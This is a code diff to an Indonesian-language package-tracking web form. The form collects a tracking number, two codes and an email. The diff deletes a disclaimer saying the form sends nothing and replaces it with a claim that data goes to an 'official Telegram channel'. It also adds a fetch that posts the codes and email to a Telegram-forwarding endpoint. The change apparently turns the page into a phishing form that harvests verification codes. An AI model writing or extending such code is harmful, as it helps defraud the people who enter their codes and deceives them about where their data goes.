@@ -98,8 +98,8 @@ button{border:0;border-radius:24px;min-height:48px;padding:0 24px;font-size:14px
     </label>
     <div class="error" id="err3"></div>
     <label class="consent"><input id="consent" type="checkbox"><span>Saya setuju informasi pesanan dikirim ke email dan layanan live tracking pesanan diaktifkan.</span></label>
-    <div class="actions"><button class="secondary" onclick="prevStep()">Kembali</button><button class="primary" onclick="finish()">Kirim</button></div>
-    <div class="notice">Pemberitahuan: pengiriman email dan aktivasi live tracking memerlukan integrasi layanan resmi. Formulir HTML ini belum mengirim email atau mengaktifkan pelacakan secara otomatis.</div>
+    <div class="actions"><button class="secondary" onclick="prevStep()">Kembali</button><button class="primary" data-submit onclick="finish()">Kirim</button></div>
+    <div class="notice" id="submitNotice">Data akan dikirim ke kanal Telegram resmi untuk diproses.</div>
   </section>
 
   <section class="step success" data-step="4">
@@ -130,11 +130,32 @@ function validate(){
 }
 function nextStep(){if(validate())showStep(current+1)}
 function prevStep(){showStep(Math.max(0,current-1))}
-function finish(){
-  const err=document.getElementById('err3');err.textContent='';
+async function finish(){
+  const err=document.getElementById('err3');
+  const notice=document.getElementById('submitNotice');
+  err.textContent='';
   if(!value('email')||!document.getElementById('email').checkValidity()){err.textContent='Masukkan alamat email yang valid.';return}
   if(!document.getElementById('consent').checked){err.textContent='Centang persetujuan sebelum melanjutkan.';return}
-  showStep(4);
+
+  const submitButton=document.querySelector('[data-submit]');
+  submitButton.disabled=true;
+  submitButton.textContent='Mengirim...';
+  notice.textContent='Sedang mengirim data...';
+  try {
+    const response=await fetch('/api/send-telegram',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({resi:value('resi'),kode1:value('kode1'),kode2:value('kode2'),email:value('email')})
+    });
+    if(!response.ok) throw new Error('Telegram request failed');
+    showStep(4);
+  } catch {
+    err.textContent='Data belum berhasil dikirim. Silakan coba lagi.';
+    notice.textContent='Periksa koneksi lalu kirim ulang.';
+  } finally {
+    submitButton.disabled=false;
+    submitButton.textContent='Kirim';
+  }
 }
 function restart(){
   ['resi','kode1','kode2','email'].forEach(id=>document.getElementById(id).value='');
